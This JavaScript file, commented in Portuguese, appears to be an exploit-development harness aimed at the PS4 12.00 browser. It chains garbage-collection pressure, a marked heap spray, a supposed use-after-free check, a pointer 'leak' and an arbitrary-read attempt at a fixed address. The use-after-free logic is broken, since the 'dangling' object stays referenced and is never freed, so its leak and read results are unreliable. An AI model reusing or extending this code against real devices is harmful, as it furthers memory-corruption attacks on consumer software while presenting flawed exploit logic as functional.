// js/test.bundle.mjs - MODO DEBUG ANTI-CRASH para PS4 12.00

import { logToDiv, PAUSE, AdvancedInt64, toHex, getElementById } from './utils.bundle.mjs';

export const SHORT_PAUSE_S3 = 100;
export const MEDIUM_PAUSE_S3 = 300;

export const logS3 = (message, type = 'info', funcName = '') => {
    logToDiv('output-advanced', message, type, funcName);
};

export const PAUSE_S3 = (ms = SHORT_PAUSE_S3) => PAUSE(ms);

export const FNAME_MODULE_UAF_TEST = "UAF_DEBUG_PS4_12";

// --- GC Leve (evita crash, mas pressiona) ---
async function triggerGC_Light() {
    logS3("    GC Leve: alocando 200MB...", "info");
    try {
        const arr = [];
        for (let i = 0; i < 500; i++) {
            arr.push(new ArrayBuffer(1024 * 400)); // ~400KB cada → 200MB
            if (i % 100 === 0) await PAUSE_S3(10);
        }
    } catch (e) {
        logS3("    OOM parcial (bom sinal)", "good");
    }
    await PAUSE_S3(300);
}

// --- Spray Agressivo (2048 buffers) ---
function sprayHeap() {
    const spray_buffers = [];
    logS3("    Spray: 2048 buffers de 136 bytes...", "info");
    for (let i = 0; i < 2048; i++) {
        const buf = new ArrayBuffer(136);
        const view = new BigUint64Array(buf);
        view[0] = 0x4141414141414141n + BigInt(i);
        view[1] = 0x4242424242424242n;
        spray_buffers.push(buf);
    }
    logS3(`    Spray concluído: ${spray_buffers.length} buffers`, "info");
    return spray_buffers;
}

// --- Dangling Pointer ---
function createDangling() {
    let ref = null;
    function scope() {
        const victim = {
            corrupted_prop: 0.12345,
            prop_a: 0x1111, prop_b: 0x2222,
            p1:0, p2:0, p3:0, p4:0, p5:0, p6:0, p7:0, p8:0
        };
        ref = victim;
    }
    scope();
    return ref;
}

// --- Checagem Imediata ---
function checkUAF(dangling, original = 0.12345) {
    const val = dangling.corrupted_prop;
    const type = typeof val;
    logS3(`DEBUG: corrupted_prop = ${val} (type: ${type})`, "info");

    if (type !== 'number' || Math.abs(val - original) > 1e-6) {
        logS3("UAF DETECTADO! Valor corrompido!", "vuln");
        return true;
    }
    return false;
}

// --- Execução Principal ---
async function executeUAFTestChain() {
    logS3(`--- INICIANDO MODO DEBUG UAF ---`, "test");

    for (let attempt = 1; attempt <= 15; attempt++) {
        logS3(`\nTentativa ${attempt}/15`, "warn");
        let dangling = null;
        let spray = [];

        try {
            // 1. Limpeza
            await triggerGC_Light();

            // 2. Criar UAF
            dangling = createDangling();
            logS3("    Dangling pointer criado", "info");

            // 3. Forçar GC
            await triggerGC_Light();
            await PAUSE_S3(200);

            // 4. Spray
            spray = sprayHeap();

            // 5. CHECAR IMEDIATAMENTE
            if (checkUAF(dangling)) {
                // --- SUCESSO! ---
                const leaked = new Float64Array([dangling.corrupted_prop]);
                const view = new Uint32Array(leaked.buffer);
                const addr = new AdvancedInt64(view[0], view[1]);

                logS3(`PONTEIRO VAZADO: ${addr.toString(true)}`, "leak");

                // Tentar leitura arbitrária
                try {
                    const corrupted_buf = spray.find(buf => {
                        const v = new BigUint64Array(buf);
                        return v[0] !== (0x4141414141414141n + BigInt(spray.indexOf(buf)));
                    });
                    if (corrupted_buf) {
                        dangling.prop_b = 0.0; // limpa
                        const target = new AdvancedInt64("0x00000000", "0x08000000");
                        dangling.prop_b = new Float64Array([target.toNumber()])[0];

                        const dv = new DataView(corrupted_buf);
                        const read = dv.getUint32(0, true);
                        logS3(`LEITURA ARB: 0x${toHex(read)}`, "vuln");
                    }
                } catch (e) { logS3("Leitura falhou", "warn"); }

                document.title = "UAF SUCCESS!";
                return { success: true };
            } else {
                logS3("Sem UAF nesta tentativa", "info");
            }

        } catch (e) {
            logS3(`Erro na tentativa ${attempt}: ${e.message}`, "error");
        }

        // Limpeza
        spray = [];
        await PAUSE_S3(300);
    }

    logS3("FALHA: UAF não detectado após 15 tentativas", "critical");
    document.title = "UAF FAIL";
    return { success: false };
}

// --- Runner ---
async function runUAFReproStrategy() {
    const result = await executeUAFTestChain();
    logS3(`==== TESTE FINALIZADO: ${result.success ? 'SUCESSO' : 'FALHA'} ====`, result.success ? "vuln" : "critical");
}

export async function runAllAdvancedTests() {
    logS3(`==== INICIANDO DEBUG PS4 12.00 ====`, 'test');
    await runUAFReproStrategy();
    logS3(`==== FIM ====`, 'test');
    const btn = getElementById('runIsolatedTestBtn');
    if (btn) btn.disabled = false;
}
